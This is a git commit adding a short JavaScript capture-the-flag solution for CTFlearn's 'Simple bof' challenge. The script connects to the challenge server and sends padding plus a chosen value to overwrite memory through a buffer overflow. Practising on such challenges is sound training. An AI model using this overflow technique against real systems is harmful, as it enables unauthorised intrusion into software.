8c8eedb776eca19eb01d232ab52722748ec8d24f
awt-256 <68395886+awt-256@users.noreply.github.com>
2021-10-05 20:39:54 -0400

    Create bof.ctflearn.js

---
+++ usage/bof.ctflearn.js
@@ -0,0 +1,20 @@
+/**
+ * https://ctflearn.com/challenge/1010 (Simple bof)
+ *
+ * Overflow and overwrite
+ */
+
+ const { Remote, convo } = require("../pwn");
+
+ (async () => {
+     const remote = Remote.create("thekidofarcrania.com", 35235);
+ 
+     await remote.onceDataAsync('Input some text: ');
+     const wantedValue = 0x67616C66; // given by chall
+
+     remote.send("A".repeat(0x30));
+     remote.send(convo.toBuffer(wantedValue));
+     remote.send("\n");
+ 
+     remote.pipeStdout();
+ })();
